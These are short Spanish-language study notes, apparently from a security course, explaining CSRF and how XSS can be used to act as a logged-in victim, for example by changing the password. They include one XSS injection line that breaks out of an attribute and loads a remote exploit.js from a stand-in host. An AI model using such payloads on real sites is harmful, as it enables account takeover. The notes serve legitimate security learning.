# Cross-Site Request Forgery (CSRF) 
## Qué es

CSRF es una vulnerabilidad de front-end causada por entrada de usuario no filtrada. Puede aprovechar vulnerabilidades XSS para ejecutar peticiones o llamadas a APIs en una aplicación web donde la víctima ya está autenticada, permitiendo al atacante realizar acciones **como si fuera el usuario autenticado**.

## Ejemplo de ataque 

* Un atacante puede crear un payload JavaScript que cambie automáticamente la contraseña de la víctima usando la sesión autenticada de la víctima.
* Si la víctima ve ese payload en una página vulnerable (por ejemplo, en un comentario malicioso), el JavaScript se ejecuta y cambia la contraseña; luego el atacante puede iniciar sesión con la nueva contraseña y controlar la cuenta.
* También puede apuntar a administradores para usar sus privilegios y, potencialmente, atacar el back-end.

## Ejemplo concreto de carga remota

```html
"><script src=//www.example.com/exploit.js></script>
```

* `exploit.js` contendría el código JavaScript malicioso que automatiza el cambio de contraseña u otras acciones, y necesita comprender cómo funcionan los procedimientos/APIs de la aplicación objetivo para replicarlos.

